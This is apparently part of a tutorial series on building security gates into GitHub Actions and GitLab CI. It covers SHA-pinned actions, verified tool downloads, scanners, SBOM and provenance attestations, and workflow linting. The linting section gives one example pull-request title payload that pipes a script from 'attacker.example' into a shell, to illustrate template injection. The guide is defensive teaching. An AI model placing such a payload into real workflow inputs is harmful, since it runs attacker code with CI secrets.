---
title: 'Security Gates in CI/CD: GitHub Actions and GitLab CI'
description: 'Run security gates in GitHub Actions and GitLab CI: SHA-pinned actions, actionlint and zizmor, code scanning, signed provenance and SBOM attestations.'
order: 4
---

Parts 1 to 3 built four gates for `orders-api`: Kubernetes and Dockerfile policies, a vulnerability gate, and a compliance gate, plus a secrets scan. This part runs them in one GitHub Actions workflow, sends the results where developers look, signs what the pipeline builds, and checks the pipeline itself. A GitLab CI translation of the main gates follows at the end.

The order matters. Fast checks that need no build run in parallel on every pull request. The image is built only when they pass, and it is pushed, attested and deployed only from the main branch.

```diagram
{
  "type": "graph",
  "columns": [
    [
      { "id": "pr", "label": "Pull request or push", "icon": "branch", "tone": "slate" }
    ],
    [
      { "id": "secrets", "label": "Secrets", "sub": "gitleaks", "icon": "lock", "tone": "red" },
      { "id": "sast", "label": "SAST", "sub": "Semgrep", "icon": "activity", "tone": "blue" },
      { "id": "policy", "label": "Policy", "sub": "opa test, conftest", "icon": "shield", "tone": "violet" },
      { "id": "vulns", "label": "Vulnerabilities", "sub": "OSV-Scanner, KEV, EPSS", "icon": "database", "tone": "amber" },
      { "id": "iac", "label": "Compliance", "sub": "Checkov, control map", "icon": "check", "tone": "green" }
    ],
    [
      { "id": "build", "label": "Build image", "sub": "Trivy image scan", "icon": "box", "tone": "accent", "detail": "Runs only when every job in the first column passed. Pushes, signs and attests only on main." }
    ],
    [
      { "id": "deploy", "label": "Deploy", "sub": "verify attestations, approval", "icon": "rocket", "tone": "green" }
    ]
  ],
  "edges": [
    ["pr", "secrets"], ["pr", "sast"], ["pr", "policy"], ["pr", "vulns"], ["pr", "iac"],
    ["secrets", "build"], ["sast", "build"], ["policy", "build"], ["vulns", "build"], ["iac", "build"],
    ["build", "deploy", "main only"]
  ]
}
```

## Prerequisites

- The `orders-api` repository with the files from parts 1 to 3: `policy/`, `k8s/`, `Dockerfile`, `gradle.lockfile`, `scripts/enrich.sh`, `exceptions.yaml`, `terraform/`, `checks/`, `compliance/controls.yaml` and `.checkov.yaml`.
- A GitHub repository. Code scanning and dependency review are free on public repositories; private repositories need GitHub Code Security (or GitHub Advanced Security), and artifact attestations in private repositories need GitHub Enterprise Cloud.
- [actionlint](https://github.com/rhysd/actionlint) and [zizmor](https://docs.zizmor.sh/) to check workflows locally.

## Pin and Verify the Gate Tools

Security tools run with access to your source code, your `GITHUB_TOKEN` and often your cloud credentials, which makes them a target. On 19 March 2026, attackers who still had credentials from an earlier breach force-pushed malicious commits to 76 of the 77 version tags of `aquasecurity/trivy-action` and to the tags of `aquasecurity/setup-trivy`, and published a malicious Trivy 0.69.4 binary. Every workflow that referenced those actions by tag ran code that stole CI secrets, and then ran the real scan so the job still looked normal. Four days later, the same group compromised Checkmarx's KICS GitHub Action.

A tag is a movable pointer. A full commit SHA is not. Pin every third-party action to a SHA and keep the version in a comment, so humans and Dependabot can read it:

```yaml
- uses: aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25 # v0.36.0
```

Three settings keep pinning manageable:

- **Dependabot updates the SHAs** and the version comments for you. A `cooldown` delays version updates until a release has been public for some days, which gives the community time to spot a compromised release:

  ```yaml
  # .github/dependabot.yml
  version: 2
  updates:
    - package-ecosystem: github-actions
      directory: /
      schedule:
        interval: weekly
      cooldown:
        default-days: 7
  ```

- **Enforce it.** Since August 2025, the "Allow actions" policy for an organization or repository has an option to require actions to be pinned to a full-length commit SHA. Unpinned workflows then fail.
- **Pin container images and binaries too.** `uses: docker://image:tag@sha256:...` pins a container step. For tools you download, pin the version and check the checksum, and where the project signs its releases, check the signature.

Checksums prove that you got the file the release page lists. A signature or attestation proves who built it. Here is all three for two of the tools this guide uses, Trivy (signed with Sigstore) and Conftest (with GitHub artifact attestations):

```terminal
{
  "title": "verify downloads",
  "prompt": "$",
  "steps": [
    {
      "comment": "1. checksum from the release's checksums file",
      "cmd": "grep ' trivy_0.76.1_Linux-64bit.tar.gz$' trivy_0.76.1_checksums.txt | sha256sum -c -",
      "output": "trivy_0.76.1_Linux-64bit.tar.gz: OK"
    },
    {
      "comment": "2. Sigstore signature: which workflow, from which tag, built this file",
      "cmd": "cosign verify-blob --bundle trivy_0.76.1_Linux-64bit.tar.gz.sigstore.json --certificate-identity https://github.com/aquasecurity/trivy/.github/workflows/reusable-release.yaml@refs/tags/v0.76.1 --certificate-oidc-issuer https://token.actions.githubusercontent.com trivy_0.76.1_Linux-64bit.tar.gz",
      "output": "Verified OK"
    },
    {
      "comment": "3. SLSA build provenance from GitHub artifact attestations",
      "cmd": "gh --version | head -n 1",
      "output": "gh version 2.103.1 (2026-10-23)"
    },
    {
      "cmd": "gh attestation verify conftest_0.71.1_Linux_x86_64.tar.gz --repo open-policy-agent/conftest --signer-workflow open-policy-agent/conftest/.github/workflows/release.yaml --source-ref refs/tags/v0.71.1 --deny-self-hosted-runners",
      "output": "Loaded digest sha256:c3f6b2a753bd56e377a1e51a95ae3e057f926f2e9139f7d5b5dfbbaf810f7985 for file://conftest_0.71.1_Linux_x86_64.tar.gz\nLoaded 1 attestation from GitHub API\n\nThe following policy criteria will be enforced:\n- Predicate type must match:..................... https://slsa.dev/provenance/v1\n- Source Repository Owner URI must match:........ https://github.com/open-policy-agent\n- Source Repository URI must match:.............. https://github.com/open-policy-agent/conftest\n- Source repo ref must match:.................... refs/tags/v0.71.1\n- Subject Alternative Name must match regex:..... ^https://github\\.com/open-policy-agent/conftest/\\.github/workflows/release\\.yaml(@(refs/.*|[0-9a-fA-F]+))?$\n- OIDC Issuer must match:........................ https://token.actions.githubusercontent.com\n- Action workflow Runner Environment must match : github-hosted\n\n✓ Verification succeeded!\n\nThe following 1 attestation matched the policy criteria\n\n- Attestation #1\n  - Build repo:..... open-policy-agent/conftest\n  - Build workflow:. .github/workflows/release.yaml@refs/tags/v0.71.1\n  - Signer repo:.... open-policy-agent/conftest\n  - Signer workflow: .github/workflows/release.yaml@refs/tags/v0.71.1"
    }
  ]
}
```

Pin the identity, not just "signed by someone": `--certificate-identity` and `--signer-workflow` name the exact release workflow, and `--source-ref` the exact tag. Without them, a signature made by any workflow in the repository, including one started from a pull request, would pass. `gh attestation verify` needs a GitHub token, even for public repositories. Use GitHub CLI 2.102.0 or later: versions 2.68.0 to 2.101.0 compared `--source-ref` without regard to case ([GHSA-4mq3-hpgx-9cx8](https://github.com/cli/cli/security/advisories/GHSA-4mq3-hpgx-9cx8), September 2026).

## The Workflow

Here is the full pipeline. Each job maps to a gate from the earlier parts, every action is pinned to a SHA, every job gets only the permissions it needs, and `actions/checkout` does not leave the token in the workspace (`persist-credentials: false`).

```yaml
name: security-gates

on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read

concurrency:
  group: security-gates-${{ github.ref }}
  cancel-in-progress: true

env:
  GITLEAKS_VERSION: 8.30.1
  OSV_SCANNER_VERSION: 2.7.0

jobs:
  secrets:
    name: Secrets (gitleaks)
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          fetch-depth: 0
          persist-credentials: false
      - name: Install gitleaks
        run: |
          base="https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}"
          curl -fsSLO "${base}/gitleaks_${GITLEAKS_VERSION}_linux_x64.tar.gz"
          curl -fsSLO "${base}/gitleaks_${GITLEAKS_VERSION}_checksums.txt"
          grep " gitleaks_${GITLEAKS_VERSION}_linux_x64.tar.gz$" "gitleaks_${GITLEAKS_VERSION}_checksums.txt" | sha256sum -c -
          tar xzf "gitleaks_${GITLEAKS_VERSION}_linux_x64.tar.gz" gitleaks
      - name: Scan the new commits
        env:
          BASE: ${{ github.event.pull_request.base.sha || github.event.before }}
        run: |
          # The first push of a branch has no previous commit: scan its whole history
          # --ignore-gitleaks-allow: inline "gitleaks:allow" comments do not count;
          # exceptions go into the reviewed .gitleaksignore file instead
          if [ "${BASE}" = "0000000000000000000000000000000000000000" ]; then
            ./gitleaks git --redact --no-banner --ignore-gitleaks-allow .
          else
            ./gitleaks git --redact --no-banner --ignore-gitleaks-allow --log-opts="${BASE}..HEAD" .
          fi

  sast:
    name: SAST (Semgrep)
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      security-events: write # upload SARIF to code scanning
    container:
      image: semgrep/semgrep:1.182.0@sha256:4a34048c04fef049f71665047f074cffb00cc3d89482f965a5cd151d589237af
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      # --disable-nosem: inline "nosemgrep" comments do not hide findings
      - run: semgrep scan --config p/java --metrics off --error --disable-nosem --sarif-output semgrep.sarif
      - uses: github/codeql-action/upload-sarif@9b3254085494b55a0f7c4c2b3d2d52cc712ce370 # v4.39.1
        if: always()
        with:
          sarif_file: semgrep.sarif
          category: semgrep

  policy:
    name: Policy (OPA and Conftest)
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: open-policy-agent/setup-opa@b2b258e089860efaadaaf71bf6e3aecb4a3eeff1 # v2.4.0
        with:
          version: 1.21.4
      - run: opa test policy/
      - name: Kubernetes manifests
        uses: docker://openpolicyagent/conftest:v0.71.1@sha256:0e77cdf7c1fcde035f3c579e4aaa6664ee2a8be5777eaa9af9f520cdd02280c0
        with:
          args: test --namespace kubernetes --output github k8s/
      - name: Dockerfile
        uses: docker://openpolicyagent/conftest:v0.71.1@sha256:0e77cdf7c1fcde035f3c579e4aaa6664ee2a8be5777eaa9af9f520cdd02280c0
        with:
          args: test --namespace docker --output github Dockerfile

  vulnerabilities:
    name: Vulnerabilities (OSV-Scanner, KEV, EPSS)
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      security-events: write # upload SARIF to code scanning
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - name: Install osv-scanner
        run: |
          base="https://github.com/google/osv-scanner/releases/download/v${OSV_SCANNER_VERSION}"
          curl -fsSLO "${base}/osv-scanner_linux_amd64"
          curl -fsSLO "${base}/osv-scanner_SHA256SUMS"
          grep " osv-scanner_linux_amd64$" osv-scanner_SHA256SUMS | sha256sum -c -
          install -m 755 osv-scanner_linux_amd64 /usr/local/bin/osv-scanner
      - name: Scan the lockfile
        # Exit code 1 means "vulnerabilities found" and the policy below decides.
        # Any other non-zero exit code is a real error and fails the step.
        run: |
          osv-scanner scan source --lockfile gradle.lockfile --format json --output-file osv.json || [ $? -eq 1 ]
          osv-scanner scan source --lockfile gradle.lockfile --format sarif --output-file osv.sarif || [ $? -eq 1 ]
      - run: ./scripts/enrich.sh osv.json
      - name: Vulnerability gate
        uses: docker://openpolicyagent/conftest:v0.71.1@sha256:0e77cdf7c1fcde035f3c579e4aaa6664ee2a8be5777eaa9af9f520cdd02280c0
        with:
          args: test findings.json --namespace vulns --data exceptions.yaml --output github
      - uses: github/codeql-action/upload-sarif@9b3254085494b55a0f7c4c2b3d2d52cc712ce370 # v4.39.1
        if: always()
        with:
          sarif_file: osv.sarif
          category: osv-scanner

  dependency-graph:
    name: Gradle dependency graph
    runs-on: ubuntu-24.04
    permissions:
      contents: write # the dependency submission API needs it
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: actions/setup-java@b843ebf9b913146b38da2eaa7aeddf76074ae1ad # v6.1.0
        with:
          distribution: temurin
          java-version: '21'
      - uses: gradle/actions/dependency-submission@3f5f9adaf7d9fecd50b5935e54106014257a94e6 # v6.4.0

  dependency-review:
    name: Dependency review
    if: github.event_name == 'pull_request'
    needs: dependency-graph
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: actions/dependency-review-action@a1d282b36b6f3519aa1f3fc636f609c47dddb294 # v5.0.0
        with:
          # the vulnerabilities job decides on CVEs, with the exceptions in exceptions.yaml
          vulnerability-check: false
          allow-licenses: Apache-2.0, MIT, BSD-2-Clause, BSD-3-Clause, ISC, EPL-1.0, EPL-2.0
          retry-on-snapshot-warnings: true

  compliance:
    name: Compliance (Checkov)
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      security-events: write # upload SARIF to code scanning
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: actions/setup-python@6d4fd22b20465ccc0f7354476588e8df7c9ca0e0 # v7.1.0
        with:
          python-version: '3.13'
      - run: pip install checkov==3.3.30
      - name: Checkov (report only, see soft-fail in .checkov.yaml)
        run: checkov --directory terraform --config-file .checkov.yaml --output json --output sarif --output-file-path checkov-results
      - name: Compliance gate
        uses: docker://openpolicyagent/conftest:v0.71.1@sha256:0e77cdf7c1fcde035f3c579e4aaa6664ee2a8be5777eaa9af9f520cdd02280c0
        with:
          args: test checkov-results/results_json.json --namespace compliance --data compliance/controls.yaml --output github
      - uses: github/codeql-action/upload-sarif@9b3254085494b55a0f7c4c2b3d2d52cc712ce370 # v4.39.1
        if: always()
        with:
          sarif_file: checkov-results/results_sarif.sarif
          category: checkov

  build:
    name: Build, scan and attest
    needs: [secrets, sast, policy, vulnerabilities, dependency-graph, dependency-review, compliance]
    # dependency-review is skipped on pushes, so do not require success, only no failure
    if: ${{ !cancelled() && !contains(needs.*.result, 'failure') && !contains(needs.*.result, 'cancelled') }}
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      packages: write # push to ghcr.io
      security-events: write # upload SARIF to code scanning
      id-token: write # Sigstore certificate for the attestations
      attestations: write
      artifact-metadata: write
    outputs:
      image: ${{ steps.name.outputs.image }}
      digest: ${{ steps.image.outputs.digest }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - name: Image name (registry names must be lowercase)
        id: name
        run: echo "image=ghcr.io/${GITHUB_REPOSITORY,,}" >> "$GITHUB_OUTPUT"
      - uses: actions/setup-java@b843ebf9b913146b38da2eaa7aeddf76074ae1ad # v6.1.0
        with:
          distribution: temurin
          java-version: '21'
      - uses: gradle/actions/setup-gradle@3f5f9adaf7d9fecd50b5935e54106014257a94e6 # v6.4.0
        with:
          cache-disabled: true # no build cache in the job that publishes the image
      - name: Build the application JAR
        run: ./gradlew --no-daemon bootJar
      - uses: docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069 # v4.4.1
      - uses: docker/login-action@81c6f93d4bc991e510b342a00b419b3bb4efc5c6 # v4.7.0
        if: github.event_name == 'push'
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - name: Build (push only from main)
        id: image
        uses: docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc # v7.4.0
        with:
          context: .
          load: ${{ github.event_name == 'pull_request' }}
          push: ${{ github.event_name == 'push' }}
          tags: ${{ steps.name.outputs.image }}:${{ github.sha }}
      - name: Image scan for code scanning
        uses: aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25 # v0.36.0
        with:
          version: v0.76.1
          image-ref: ${{ steps.name.outputs.image }}:${{ github.sha }}
          format: sarif
          output: trivy.sarif
          severity: CRITICAL,HIGH
          limit-severities-for-sarif: true
      - uses: github/codeql-action/upload-sarif@9b3254085494b55a0f7c4c2b3d2d52cc712ce370 # v4.39.1
        with:
          sarif_file: trivy.sarif
          category: trivy-image
      - name: Image gate (fixable critical OS package vulnerabilities)
        uses: aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25 # v0.36.0
        env:
          TRIVY_PKG_TYPES: os # application libraries are gated by the vulnerabilities job
        with:
          skip-setup-trivy: true
          image-ref: ${{ steps.name.outputs.image }}:${{ github.sha }}
          severity: CRITICAL
          ignore-unfixed: true
          exit-code: '1'
      - name: SBOM
        if: github.event_name == 'push'
        uses: aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25 # v0.36.0
        with:
          skip-setup-trivy: true
          image-ref: ${{ steps.name.outputs.image }}:${{ github.sha }}
          format: cyclonedx
          output: sbom.cdx.json
      - name: Attest build provenance
        if: github.event_name == 'push'
        uses: actions/attest@1e69f48acb82d1966a394da916b4c1698aa569d6 # v4.2.2
        with:
          subject-name: ${{ steps.name.outputs.image }}
          subject-digest: ${{ steps.image.outputs.digest }}
          push-to-registry: true
      - name: Attest the SBOM
        if: github.event_name == 'push'
        uses: actions/attest@1e69f48acb82d1966a394da916b4c1698aa569d6 # v4.2.2
        with:
          subject-name: ${{ steps.name.outputs.image }}
          subject-digest: ${{ steps.image.outputs.digest }}
          sbom-path: sbom.cdx.json
          push-to-registry: true

  deploy:
    name: Deploy
    # dependency-review is skipped on pushes, and a skipped job further up the chain
    # would skip this job too, so check the build result directly
    if: ${{ !cancelled() && github.event_name == 'push' && needs.build.result == 'success' }}
    needs: build
    runs-on: ubuntu-24.04
    environment: production
    permissions:
      contents: read
      packages: read
      attestations: read
    env:
      IMAGE: ${{ needs.build.outputs.image }}@${{ needs.build.outputs.digest }}
    steps:
      - uses: docker/login-action@81c6f93d4bc991e510b342a00b419b3bb4efc5c6 # v4.7.0
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - name: Verify provenance and SBOM before deploying
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          gh attestation verify "oci://${IMAGE}" --repo "${GITHUB_REPOSITORY}" \
            --signer-workflow "${GITHUB_REPOSITORY}/.github/workflows/security-gates.yml" \
            --source-ref refs/heads/main --deny-self-hosted-runners
          gh attestation verify "oci://${IMAGE}" --repo "${GITHUB_REPOSITORY}" \
            --signer-workflow "${GITHUB_REPOSITORY}/.github/workflows/security-gates.yml" \
            --source-ref refs/heads/main --deny-self-hosted-runners \
            --predicate-type https://cyclonedx.org/bom
      - name: Deploy
        run: echo "Deploy ${IMAGE} with your deployment tool"
```

A few choices in this workflow are deliberate:

- **One decision per gate, made by a reviewed policy.** The scanners (`osv-scanner`, Checkov) run in report mode and the Conftest steps decide, exactly as in parts 2 and 3. Conftest runs from its container image, pinned by digest, so the policy jobs need no install step.
- **The image gate covers OS packages only and blocks fixable criticals.** The application's Java libraries are already gated by the vulnerabilities job, with the KEV, EPSS and exception rules from part 2; scanning them again in the image would block on the accepted Spring findings. Trivy has no KEV or EPSS data, so for OS packages this simpler rule is the gate. One gap remains: the OpenTelemetry agent that the Dockerfile downloads is not in the lockfile. Declare it as a Gradle dependency so the lockfile gate covers it, or run the part 2 steps on the image's SBOM as well.
- **The build compiles the JAR first.** The Dockerfile from part 1 copies `build/libs/orders-api.jar`, so the Gradle build is configured to write that file name (for example `archiveFileName = "orders-api.jar"` on the `bootJar` task).
- **No build cache in the publishing job.** A cache that a pull request run can write and a `main` run later restores is a way to get attacker-controlled files into a release (cache poisoning). zizmor flagged the Gradle cache in this job, so the workflow turns it off there.
- **Dependency review checks licenses here, not vulnerabilities.** The vulnerabilities job already decides on CVEs with the reviewed exceptions from part 2; a second, exception-blind vulnerability check would block on the accepted Spring findings. Dependency review only runs on pull requests, so the build job runs when no gate failed rather than requiring every gate to succeed. GitHub's dependency graph does not read Gradle files on its own, so the `dependency-graph` job submits the resolved dependencies first, and the build needs it directly, so a failed submission blocks the build instead of silently skipping the review. That job needs `contents: write`, which pull requests from forks do not get; for public repositories, use the two-workflow setup described in the `gradle/actions` documentation.
- **The image is pushed, attested and deployed only from `main`.** Pull requests from forks get a read-only token, so they could not push anyway.
- **Gitleaks runs from the CLI.** The `gitleaks/gitleaks-action` needs a license key for repositories owned by an organization; the CLI does not. `--ignore-gitleaks-allow` makes Gitleaks ignore inline `gitleaks:allow` comments, which any pull request could add, so exceptions have to go through the reviewed `.gitleaksignore` file.

## Lint the Pipeline Itself

A workflow file is code that runs with your secrets, so check it like code. [actionlint](https://github.com/rhysd/actionlint) catches syntax errors, wrong expressions, unknown permission names and (with shellcheck installed) bugs in `run:` scripts. [zizmor](https://docs.zizmor.sh/) looks for security problems: unpinned actions, template injection, credentials left by `actions/checkout`, and over-broad permissions. Here they are on a small workflow with typical mistakes:

```yaml
name: scan
on: pull_request
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Report
        run: echo "Scanning ${{ github.event.pull_request.title }}"
      - uses: aquasecurity/trivy-action@master
        with:
          scan-type: fs
          exit-code: 1
      - uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: trivy.sarif
```

```terminal
{
  "title": "actionlint and zizmor",
  "prompt": "$",
  "steps": [
    {
      "cmd": "actionlint",
      "output": ".github/workflows/scan.yml:7:15: the runner of \"actions/checkout@v3\" action is too old to run on GitHub Actions. update the action's version to fix this issue [action]\n  |\n7 |       - uses: actions/checkout@v3\n  |               ^~~~~~~~~~~~~~~~~~~\n.github/workflows/scan.yml:9:33: \"github.event.pull_request.title\" is potentially untrusted. avoid using it directly in inline scripts. instead, pass it through an environment variable. see https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks for more details [expression]\n  |\n9 |         run: echo \"Scanning ${{ github.event.pull_request.title }}\"\n  |                                 ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
    },
    {
      "comment": "--format github prints one line per finding; --quiet drops the progress log",
      "cmd": "zizmor --offline --quiet --format github .github/workflows/scan.yml",
      "output": "::warning file=.github/workflows/scan.yml,line=7,title=artipacked::scan.yml:7: credential persistence through GitHub Actions artifacts: does not set persist-credentials: false\n::warning file=.github/workflows/scan.yml,line=4,title=excessive-permissions::scan.yml:4: overly broad permissions: default permissions used due to no permissions: block\n::error file=.github/workflows/scan.yml,line=9,title=template-injection::scan.yml:9: code injection via template expansion: may expand into attacker-controllable code\n::error file=.github/workflows/scan.yml,line=7,title=unpinned-uses::scan.yml:7: unpinned action reference: action is not pinned to a hash (required by blanket policy)\n::error file=.github/workflows/scan.yml,line=10,title=unpinned-uses::scan.yml:10: unpinned action reference: action is not pinned to a hash (required by blanket policy)\n::error file=.github/workflows/scan.yml,line=14,title=unpinned-uses::scan.yml:14: unpinned action reference: action is not pinned to a hash (required by blanket policy)"
    }
  ]
}
```

A pull request title like `"; curl https://attacker.example | sh; echo "` would run as shell code in the `Report` step. Pass untrusted values through an environment variable instead (`env: TITLE: ${{ github.event.pull_request.title }}` and `echo "$TITLE"`). actionlint does not check pinning, and zizmor does not check syntax, so run both. In the `orders-api` repository, which has only the full workflow from above, both are clean:

```terminal
{
  "title": "the real workflow",
  "prompt": "$",
  "steps": [
    {
      "cmd": "actionlint -version | head -n 1",
      "output": "1.7.12"
    },
    {
      "cmd": "shellcheck --version | sed -n 2p",
      "output": "version: 0.11.0"
    },
    {
      "cmd": "actionlint && echo \"actionlint: no problems found\"",
      "output": "actionlint: no problems found"
    },
    {
      "cmd": "zizmor --quiet .github/workflows/security-gates.yml",
      "output": "No findings to report. Good job! (2 suppressed)"
    }
  ]
}
```

Without `--offline`, zizmor also asks the GitHub API whether each pinned SHA belongs to the repository it claims to (an "impostor commit" would not) and whether any pinned version has a known advisory. It needs a `GH_TOKEN` for that. Run both linters in the pipeline itself, and add zizmor's SARIF output to code scanning if you want its findings next to the others.

## Send Results Where Developers Look

A gate that only writes to a job log gets ignored. Each gate in the workflow reports in a second place:

- **Annotations.** `conftest --output github` turns each `deny` into an error annotation that names the checked file, shown in the job summary and on the pull request's checks.
- **Code scanning.** Semgrep, Checkov and Trivy upload SARIF with a distinct `category`, so results from different tools do not overwrite each other. Code scanning tracks each alert over time, links it to the line, and lets someone dismiss it with a reason, which is also an audit trail.
- **Dependency review** comments on the pull request when you set `comment-summary-in-pr: always` (and grant `pull-requests: write`).

Then make the results binding. In the repository's rulesets, require the status checks of the gate jobs. Add the **"Require code scanning results"** rule for tools that have no policy job of their own, such as Semgrep. It blocks a merge when code scanning finds new alerts at or above the level you choose (for security alerts: critical, high or higher, medium or higher, or all), and it also blocks while a required tool has not finished. Do not require it for the OSV-Scanner and Trivy results: their raw alerts know nothing about `exceptions.yaml`, so they would overrule the decisions of the vulnerability gate.

## Cache the Scanner Databases

Trivy's vulnerability database is about 130 MB to download and 1.6 GB unpacked (October 2026). `trivy-action` caches it between runs by default (`cache: true`), keyed by date. If you run Trivy or Grype another way, cache their database directories (`~/.cache/trivy`, `~/.cache/grype`) with `actions/cache` and a key that changes once a day, so a cache hit is never more than a day old. OSV-Scanner and the KEV and EPSS lookups in `enrich.sh` query APIs instead, so they have nothing to cache.

## Signed Provenance and SBOMs

On `main`, the build job adds two **attestations** to the image: SLSA build provenance (which repository, workflow, commit and runner built this digest) and the CycloneDX SBOM. `actions/attest` signs both with a short-lived Sigstore certificate tied to the workflow's OIDC identity, so there are no keys to manage, and `push-to-registry: true` stores them next to the image in GHCR. The deploy job checks both with `gh attestation verify` before it does anything else, the same command that verified Conftest above.

A few facts that are easy to mix up:

- **SLSA levels.** GitHub states that artifact attestations on their own provide **SLSA v1.0 Build Level 2** (signed provenance from a hosted build platform). Level 3 needs the build isolated from the workflow that calls it, which on GitHub means building in a shared reusable workflow. The current SLSA specification, 1.2, keeps these build levels and adds a Source track for the repository side.
- **`actions/attest` replaces the older actions.** Since version 4, `actions/attest-build-provenance` is a thin wrapper around `actions/attest`, and `attest-sbom` is merged into it (`sbom-path`).
- **cosign** is the tool for the same job outside GitHub, for example in GitLab CI with keyless signing. In cosign 3, `cosign attach sbom` and the other `attach` commands are deprecated and will be removed in cosign 4. Use `cosign attest --type cyclonedx --predicate sbom.cdx.json <image@digest>` instead, and verify with `cosign verify-attestation`.

Verification in the pipeline protects that one deployment path. To make sure nothing unsigned runs at all, verify again at admission: Kyverno's `ImageValidatingPolicy` and the Sigstore policy-controller can both reject Pods whose image has no valid signature or attestation from your workflow ([part 1](/guides/security-gates/01-policy-as-code#h2-enforce-in-the-cluster-admission-control) covers admission control).

## Overrides Without Bypasses

Sometimes a fix has to ship while a gate is red: a production incident, or a false positive on a Friday evening. Plan for it:

- **Exceptions in Git** for anything that can wait for a review: the `exceptions.yaml` entries from part 2, the skips from part 3. They expire or need a ticket.
- **A protected environment for deployments.** The `deploy` job uses the `production` environment. Configure required reviewers on it, and allow deployments only from `main`.
- **A break-glass workflow for real emergencies.** A failed gate stops this pipeline before deployment: the early gates stop it before the build, and the image gate stops it after the push but before the attestations, so the deploy job is skipped and any deployment that verifies attestations rejects that image. No approval inside this pipeline can push the change through. Keep a separate `workflow_dispatch` workflow that deploys an image digest that was already built and attested, runs only through the `production` environment, and opens a follow-up ticket. Every use then has a named approver and a record in the deployment history.
- **No skip switches in the pipeline.** A `[skip security]` commit message or a workflow input that disables the gates gets used for convenience within a month.
- **No unreviewed suppressions.** Every scanner reads suppressions from somewhere: inline comments (`gitleaks:allow`, `nosemgrep`, `checkov:skip`), ignore files (`.gitleaksignore`, `.semgrepignore`, `.trivyignore`, `.trivyignore.yaml`) and configuration files (`.gitleaks.toml`, `trivy.yaml`, `osv-scanner.toml`, `.checkov.yaml`). Turn off inline suppressions where the tool allows it (`--ignore-gitleaks-allow`, `--disable-nosem`; the compliance policy rejects inline skips of mapped checks). Then make the security team the code owner of every gate file: those ignore and configuration files, `.github/workflows/`, `.github/CODEOWNERS` itself, `policy/`, `exceptions.yaml`, `compliance/`, `checks/` and `scripts/`. Turn on "Require review from Code Owners" in the branch ruleset; until then, code owners are only asked for a review, and nobody has to wait for it.

## The Gates in GitLab CI

GitLab CI runs the same tools. This translation covers the secrets, policy and compliance gates; add the vulnerability and SAST jobs the same way. It uses `rules` (the `only` and `except` keywords are deprecated), pins images by digest, and publishes Conftest results as JUnit reports, which GitLab shows in the merge request on every tier. It was not run for this guide; check it with the pipeline editor's validation before you use it.

```yaml
stages: [gates, build]

workflow:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH

variables:
  CONFTEST_IMAGE: openpolicyagent/conftest:v0.71.1@sha256:0e77cdf7c1fcde035f3c579e4aaa6664ee2a8be5777eaa9af9f520cdd02280c0

secrets:
  stage: gates
  image:
    name: zricethezav/gitleaks:v8.30.1@sha256:c00b6bd0aeb3071cbcb79009cb16a60dd9e0a7c60e2be9ab65d25e6bc8abbb7f
    entrypoint: ['']
  script:
    - gitleaks dir . --redact --no-banner --ignore-gitleaks-allow

policy:
  stage: gates
  image:
    name: $CONFTEST_IMAGE
    entrypoint: ['']
  script:
    - conftest verify --policy policy/
    - conftest test --namespace kubernetes --output junit k8s/ > policy-k8s.xml
    - conftest test --namespace docker --output junit Dockerfile > policy-docker.xml
  artifacts:
    when: always
    reports:
      junit: policy-*.xml

checkov:
  stage: gates
  image:
    name: bridgecrew/checkov:3.3.30@sha256:4b65e89f1fde292249fc0aa0d0db43302c036dfe39f7370b2d3517571082b894
    entrypoint: ['']
  script:
    - checkov --directory terraform --config-file .checkov.yaml --output json --output-file-path checkov-results
  artifacts:
    paths: [checkov-results/]

compliance:
  stage: gates
  needs: [checkov]
  image:
    name: $CONFTEST_IMAGE
    entrypoint: ['']
  script:
    - conftest test checkov-results/results_json.json --namespace compliance --data compliance/controls.yaml --output junit > compliance.xml
  artifacts:
    when: always
    reports:
      junit: compliance.xml

build:
  stage: build
  needs: [secrets, policy, compliance]
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
  script:
    - echo "build, scan, sign with cosign and push the image here"
```

